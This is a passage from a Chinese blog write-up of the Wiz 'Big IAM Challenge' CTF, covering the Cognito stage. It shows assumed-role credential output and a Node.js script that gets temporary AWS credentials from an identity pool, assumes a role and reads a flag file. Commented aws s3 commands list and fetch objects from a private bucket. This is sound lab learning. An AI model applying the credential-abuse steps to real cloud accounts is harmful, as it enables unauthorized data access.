class="string">tvscrQ0YnE2zdjbMSFpr6PVXYLcLjX1O0Y4TimM5VfQVKj7LxzbDM6zPYUEUqDtURpcRjaVFct9pQI9TomfCmT3gRHbn8TpY8a+Ri/htG+YMxpzY20ms4/HQEtMUPDcUsrqY61vM7IvoVo4w6+ipu9pc9/HgW</span></span><br><span class="line"><span class="string">WxPjs1nLDulLtBv772kgeFAHftNVNRGunScN0d+bb11OLezdwpzk9oXo+A10kFSDnDkW+fsr0IFbOtFXX5TmKmEcNGHU7IUWlNVBpDR/H61dcw3DlYp89ymGmjJZQ7P52oo3cfkvgYylgEHG4NjKb7amb4BLj</span></span><br><span class="line"><span class="string">VgYUK285VrwjQypaFSK3bU2rY08gBmXDHDQYPmA47TKUfOXl2g7iTs4uU5OeiAOENopef3m2XTZkyNLJifDEST/o8Yqr3ngGqGXXHE3giHqJW/HYo44Kkrr7QZxBMrXs/p2chHZmy2dfk5AZEIqDqZil6xXMM</span></span><br><span class="line"><span class="string">XkweHVbSqHyQ9xbk+1Qh2fDO9Uto=&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Expiration&quot;</span>: <span class="string">&quot;2025-03-18T08:42:21Z&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;SubjectFromWebIdentityToken&quot;</span>: <span class="string">&quot;us-east-1:157d6171-ee41-cfb4-c468-23b03dc4ee06&quot;</span>,</span><br><span class="line">    <span class="string">&quot;AssumedRoleUser&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;AssumedRoleId&quot;</span>: <span class="string">&quot;AROARK7LBOHXASFTNOIZG:KaGty1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Arn&quot;</span>: <span class="string">&quot;arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/KaGty1&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;Provider&quot;</span>: <span class="string">&quot;cognito-identity.amazonaws.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Audience&quot;</span>: <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>手动输入总是因为少字符或换行符发生错误，索性让GPT生成了个JS脚本</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">AWS</span> = <span class="built_in">require</span>(<span class="string">&#x27;aws-sdk&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置区域</span></span><br><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="title function_">update</span>(&#123; <span class="attr">region</span>: <span class="string">&#x27;us-east-1&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cognitoIdentity = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title class_">CognitoIdentity</span>();</span><br><span class="line"><span class="keyword">const</span> sts = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title function_">STS</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getTemporaryCredentials</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> identityPoolId = <span class="string">&#x27;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> roleArn = <span class="string">&#x27;arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取IdentityId</span></span><br><span class="line">        <span class="keyword">let</span> getIdParams = &#123; <span class="title class_">IdentityPoolId</span>: identityPoolId &#125;;</span><br><span class="line">        <span class="keyword">let</span> identityIdData = <span class="keyword">await</span> cognitoIdentity.<span class="title function_">getId</span>(getIdParams).<span class="title function_">promise</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;IdentityId:&#x27;</span>, identityIdData.<span class="property">IdentityId</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取WebIdentityToken</span></span><br><span class="line">        <span class="keyword">let</span> getOpenIdTokenParams = &#123; <span class="title class_">IdentityId</span>: identityIdData.<span class="property">IdentityId</span> &#125;;</span><br><span class="line">        <span class="keyword">let</span> tokenData = <span class="keyword">await</span> cognitoIdentity.<span class="title function_">getOpenIdToken</span>(getOpenIdTokenParams).<span class="title function_">promise</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;WebIdentityToken:&#x27;</span>, tokenData.<span class="property">Token</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用WebIdentityToken获取临时凭证</span></span><br><span class="line">        <span class="keyword">let</span> assumeRoleWithWebIdentityParams = &#123;</span><br><span class="line">            <span class="title class_">RoleArn</span>: roleArn,</span><br><span class="line">            <span class="title class_">RoleSessionName</span>: <span class="string">&#x27;web-session&#x27;</span>,</span><br><span class="line">            <span class="title class_">WebIdentityToken</span>: tokenData.<span class="property">Token</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> credentials = <span class="keyword">await</span> sts.<span class="title function_">assumeRoleWithWebIdentity</span>(assumeRoleWithWebIdentityParams).<span class="title function_">promise</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Temporary Credentials:&#x27;</span>, credentials.<span class="property">Credentials</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置环境变量（注意：在Node.js中直接设置环境变量不会影响父进程的环境变量）</span></span><br><span class="line">        process.<span class="property">env</span>.<span class="property">AWS_ACCESS_KEY_ID</span> = credentials.<span class="property">Credentials</span>.<span class="property">AccessKeyId</span>;</span><br><span class="line">        process.<span class="property">env</span>.<span class="property">AWS_SECRET_ACCESS_KEY</span> = credentials.<span class="property">Credentials</span>.<span class="property">SecretAccessKey</span>;</span><br><span class="line">        process.<span class="property">env</span>.<span class="property">AWS_SESSION_TOKEN</span> = credentials.<span class="property">Credentials</span>.<span class="property">SessionToken</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Environment Variables Set Successfully&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行 &#x27;aws s3 ls&#x27; 命令</span></span><br><span class="line">        <span class="title function_">exec</span>(<span class="string">&#x27;cat /tmp/flag2.txt&#x27;</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error executing aws s3 ls: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`List of S3 buckets:\n<span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//aws s3 ls</span></span><br><span class="line"><span class="comment">//aws s3api list-objects  --bucket wiz-privatefiles-x1000</span></span><br><span class="line"><span class="comment">//aws s3api get-object --bucket wiz-privatefiles-x1000 --key flag2.txt /tmp/flag2.txt</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">getTemporaryCredentials</span>();</span><br></pre></td></tr></table></figure>

<p>拿到<code>Flag</code> - <code>&#123;wiz:open-sesame-or-shell-i-say-openid&#125;</code></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250318161009311.png" alt="image-20250318161009311"></p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2025/03/03/Hessian_Rome%E9%93%BE/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
              2025-03-18 16:22:13
            </span>
            
          </div>
          <div class="post-foot-prev">
            
              <a href="/2025/03/20/Tomcat-PUT%E5%88%86%E6%9E%90/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Google-Analytics"><span class="toc-text">Google Analytics</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Enable-Push-Notification"><span class="toc-text">Enable Push Notification</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Admin-only"><span class="toc-text">Admin only?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Do-I-Know-You"><span class="toc-text">Do I Know You?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#One-final-push"><span class="toc-text">One final push</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/KaGty1">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
    <div class="footer-views">
      
      
          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
        
      
      
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        


        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + WIZCTF%20The%20Big%20IAM%20Challenges + '&url=' + http%3A%2F%2Fkagty1.github.io%2F2025%2F03%2F18%2FWIZCTF%2520The%2520Big%2520IAM%2520Challenges%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://kagty1.github.io/2025/03/18/WIZCTF%20The%20Big%20IAM%20Challenges/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
